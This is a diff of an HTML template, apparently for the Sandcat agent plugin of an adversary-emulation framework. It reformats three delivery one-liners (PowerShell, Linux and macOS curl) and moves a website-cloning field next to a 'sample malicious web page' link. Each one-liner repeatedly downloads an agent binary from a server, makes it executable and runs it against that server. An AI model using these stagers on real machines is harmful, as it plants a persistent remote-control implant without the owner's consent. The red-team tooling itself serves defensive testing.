@@ -52,13 +52,13 @@
                                 <button id="cat3" class="button-success cat-btn" style="width:20%" onclick="show('delivery-darwin')">MacOS</button>
                             </div>
                             <code id="delivery-windows" class="delivery" style="display: none">
-                                <pre>while($true){$url="http://localhost:8888/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $output="C:\Users\Public\sandcat.exe";$wc.DownloadFile($url,$output); C:\Users\Public\sandcat.exe -server http://localhost:8888 -group my_group; sleep 60}</pre>
+                                while($true){$url="http://localhost:8888/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $output="C:\Users\Public\sandcat.exe";$wc.DownloadFile($url,$output); C:\Users\Public\sandcat.exe -server http://localhost:8888 -group my_group; sleep 60}
                             </code>
                             <code id="delivery-linux" class="delivery" style="display: none">
-                                <pre>while true; do curl -sk -X POST -H 'file:sandcat.go' -H 'platform:linux' http://localhost:8888/file/download > /tmp/sandcat-linux && chmod +x /tmp/sandcat-linux && /tmp/sandcat-linux -server http://localhost:8888 -group my_group; sleep 60; done</pre>
+                                while true; do curl -sk -X POST -H 'file:sandcat.go' -H 'platform:linux' http://localhost:8888/file/download > /tmp/sandcat-linux && chmod +x /tmp/sandcat-linux && /tmp/sandcat-linux -server http://localhost:8888 -group my_group; sleep 60; done
                             </code>
                             <code id="delivery-darwin" class="delivery" style="display: none">
-                                <pre>while true; do curl -sk -X POST -H 'file:sandcat.go' -H 'platform:darwin' http://localhost:8888/file/download > /tmp/sandcat-darwin && chmod +x /tmp/sandcat-darwin && /tmp/sandcat-darwin -server http://localhost:8888 -group my_group; sleep 60; done</pre>
+                                while true; do curl -sk -X POST -H 'file:sandcat.go' -H 'platform:darwin' http://localhost:8888/file/download > /tmp/sandcat-darwin && chmod +x /tmp/sandcat-darwin && /tmp/sandcat-darwin -server http://localhost:8888 -group my_group; sleep 60; done
                             </code>
                         </div>
                         <div class="column malicious-link" style="flex:50%">
@@ -68,12 +68,12 @@
                                 54ndc47 agent. Use our sample malicious web page or overwrite it using the website
                                 cloning button below.
                             </p>
-                            <input id="cloneNew" placeholder="Enter a url"/>
-                            <button type="button" class="button-success cat-btn" onclick="cloneWebsite()">Clone</button>
-                            <br>
                             <a href="/plugin/sandcat/malicious" target="_blank">
                                 <img src="/sandcat/img/arrow.png"/>
                             </a>
+                            <br>
+                            <input id="cloneNew" placeholder="Enter a url"/>
+                            <button type="button" class="button-success cat-btn" onclick="cloneWebsite()">Clone</button>
                         </div>
                     </div>
                 </div>
